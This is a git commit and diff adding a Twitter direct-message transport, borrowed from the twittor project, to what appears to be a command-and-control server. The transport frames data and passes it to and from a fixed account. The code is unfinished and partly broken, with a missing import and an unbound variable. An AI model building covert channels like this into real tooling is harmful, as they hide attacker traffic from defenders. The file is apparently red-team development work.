3a7d9ce78555499bfd507fbdc10c2e6b45bff3a8
Jonathan Echavarria <jechavarria@reliaquest.com>
2018-01-02 17:07:12 -0500

    finished first build of twitter transport, needs testing, server built, and client built

--- debug_build/server/utils/transports/transport_twitter.py
+++ debug_build/server/utils/transports/transport_twitter.py
@@ -1,6 +1,8 @@
 # Sample transport that utilizes twitter as a communication channel.
 # Most of the code is borrowed with love from https://github.com/PaulSec/twittor/
 
+# TODO, consider if we need to delete DMs or not.
+
 import tweepy
 
 # GHETTO CONFIG SECTION, TO BE EVENTUALLY UPDATED WHEN CONFIG READING IS PATCHED IN
@@ -19,12 +21,23 @@ def prepTransport():
 	auth = tweepy.OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
 	auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)
 
-	# Construct t
+	# Construct the api instance
+	api = tweepy.API(auth)
 
 
-def sendData():
+
+def sendData(data):
+	slen = struct.pack('<I', len(data))
+	message = (slen+data)
+	api.send_direct_message(user=USERNAME, text=message)
 
 
 def retrieveData():
-
+	for message in api.direct_messages(count=200, full_text="true"):
+		if (message.sender_screen_name == USERNAME):
+			try:
+				data = message.text[4:] # ignore the frame size
+			except:
+				data = None
+				pass
 	return data
